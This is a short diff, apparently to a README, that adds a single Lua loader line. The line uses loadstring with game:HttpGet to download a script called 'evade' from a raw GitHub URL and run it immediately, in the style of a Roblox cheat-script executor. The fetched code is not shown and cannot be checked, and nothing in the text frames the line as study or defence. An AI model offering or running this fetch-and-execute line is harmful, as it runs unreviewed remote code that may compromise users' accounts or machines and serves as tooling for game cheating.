@@ -8,3 +8,5 @@
 
 
 <img width="518" height="309" alt="image" src="https://github.com/user-attachments/assets/6ca2e68c-5e4c-46fa-bc54-909c56dc4a55" />
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/delivery-2347/open-source/refs/heads/main/evade"))()
